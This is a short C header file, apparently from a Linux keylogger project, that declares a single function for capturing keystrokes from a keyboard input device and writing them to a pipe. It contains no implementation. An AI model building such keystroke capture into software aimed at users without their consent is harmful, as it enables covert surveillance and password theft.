#ifndef DEMON_KEYLOGGER_KEYLOGGER_H
#define DEMON_KEYLOGGER_KEYLOGGER_H

#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <syslog.h>

#define NUM_EVENTS 128
#define NUM_KEYCODES 71

/**
 * Captures keystrokes by reading from the keyboard resource and writes them to
 * a pipe. Continues reading until SIGINT or SIGPIPE is received.
 *
 * @param keyboard The file descriptor for the keyboard input file
 * @param write_pipe The file descriptor of the write end of the pipe
 */
void keylogger(int keyboard, int write_pipe);

#endif //DEMON_KEYLOGGER_KEYLOGGER_H
